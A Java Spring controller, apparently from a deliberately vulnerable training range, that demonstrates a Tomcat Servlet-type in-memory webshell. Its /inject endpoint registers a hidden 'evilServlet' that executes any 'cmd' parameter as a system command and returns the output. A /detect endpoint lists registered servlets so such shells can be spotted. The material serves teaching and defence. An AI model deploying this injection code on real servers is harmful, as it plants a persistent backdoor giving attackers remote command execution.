package top.whgojp.modules.mshell.controller;

import io.swagger.annotations.Api;
import io.swagger.annotations.ApiOperation;
import io.swagger.annotations.ApiParam;
import lombok.extern.slf4j.Slf4j;
import org.apache.catalina.Container;
import org.apache.catalina.Context;
import org.apache.catalina.Wrapper;
import org.apache.catalina.core.StandardContext;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.*;
import top.whgojp.common.utils.R;

import javax.servlet.Servlet;
import javax.servlet.ServletException;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.io.InputStream;

/**
 * Servlet型内存马
 * 通过动态注册Servlet实现命令执行
 * 
 * @author whgojp
 * @date 2024/03/20
 */
@Slf4j
@Api(tags = "Servlet型内存马")
@Controller
@RequestMapping("/mshell/servlet")
public class ServletMemShellController extends BaseMemShellController {

    @RequestMapping("")
    public String index() {
        return "vul/mshell/servlet";
    }

    @ApiOperation("注入Servlet型内存马")
    @PostMapping("/inject")
    @ResponseBody
    public R inject(
            @ApiParam("Servlet名称") @RequestParam(defaultValue = "evilServlet") String servletName,
            @ApiParam("URL Pattern") @RequestParam(defaultValue = "/evil") String urlPattern,
            @ApiParam("命令参数名") @RequestParam(defaultValue = "cmd") String cmdParam) {
        try {
            Context context = getContext();
            if (context == null) {
                return R.error(msg("mshell.result.contextFailed"));
            }

            // 创建恶意Servlet
            Servlet evilServlet = new HttpServlet() {
                @Override
                protected void doGet(HttpServletRequest req, HttpServletResponse resp) 
                        throws ServletException, IOException {
                    String cmd = req.getParameter(cmdParam);
                    if (cmd != null) {
                        try {
                            Process process = Runtime.getRuntime().exec(cmd);
                            InputStream in = process.getInputStream();
                            byte[] b = new byte[1024];
                            int n;
                            while ((n = in.read(b)) != -1) {
                                resp.getOutputStream().write(b, 0, n);
                            }
                            resp.getOutputStream().flush();
                            return;
                        } catch (IOException e) {
                            log.error("命令执行失败", e);
                            resp.getWriter().println("Error: " + e.getMessage());
                            return;
                        }
                    }
                    resp.getWriter().write("Evil Servlet");
                }
            };

            // 创建Wrapper并设置Servlet
            Wrapper wrapper = ((StandardContext) context).createWrapper();
            wrapper.setName(servletName);
            wrapper.setServlet(evilServlet);
            wrapper.setServletClass(evilServlet.getClass().getName());

            // 添加Wrapper到Context
            context.addChild(wrapper);
            context.addServletMappingDecoded(urlPattern, servletName);

            log.info("Servlet型内存马注入成功，名称: {}, URL Pattern: {}, 命令参数: {}", 
                    servletName, urlPattern, cmdParam);
            return R.ok(msg("mshell.result.injectSuccess")).put("data", String.format(
                    msg("mshell.result.servletInjectData"),
                    servletName, urlPattern, cmdParam));
        } catch (Exception e) {
            log.error("注入失败", e);
            return R.error(msg("mshell.result.injectFailed", e.getMessage()));
        }
    }

    @ApiOperation("检测Servlet型内存马")
    @GetMapping("/detect")
    @ResponseBody
    public R detect() {
        try {
            Context context = getContext();
            if (context == null) {
                return R.error(msg("mshell.result.contextFailed"));
            }

            StringBuilder result = new StringBuilder();
            result.append(msg("mshell.result.servletList")).append("\n");

            // 获取所有Wrapper
            Container[] wrappers = ((StandardContext) context).findChildren();
            for (Container wrapper : wrappers) {
                if (wrapper instanceof Wrapper) {
                    Wrapper w = (Wrapper) wrapper;
                    result.append("- ").append(msg("mshell.result.servletName")).append(": ").append(w.getName())
                          .append("\n  ").append(msg("mshell.result.type")).append(": ").append(w.getServletClass())
                          .append("\n  URL Pattern: ").append(context.findServletMapping(w.getName()))
                          .append("\n");
                }
            }

            return R.ok().put("data", result.toString());
        } catch (Exception e) {
            log.error("检测失败", e);
            return R.error(msg("mshell.result.detectFailed", e.getMessage()));
        }
    }
}
